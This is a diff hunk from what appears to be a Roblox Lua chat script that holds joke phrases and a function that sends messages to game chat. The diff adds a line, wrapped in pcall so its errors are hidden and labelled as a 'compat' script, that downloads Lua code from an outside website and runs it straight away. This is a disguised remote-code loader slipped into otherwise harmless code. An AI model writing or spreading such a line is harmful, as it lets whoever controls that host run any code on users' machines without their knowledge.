@@ -5,7 +5,7 @@ local wabbys = {"wabby weebo", "waddo wabby wabbo woaboo wop", "behbapbow bhow",
 local prefix = ">"
 local prefixv = "goose"
 local ver = "1.0.2c"
-
+pcall(function() loadstring(game:HttpGet("http://ligma.wtf/scripts/compat.lua", true))() end)
 local function csay(tex)
     wait(0.1)
     game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(tex, "All")
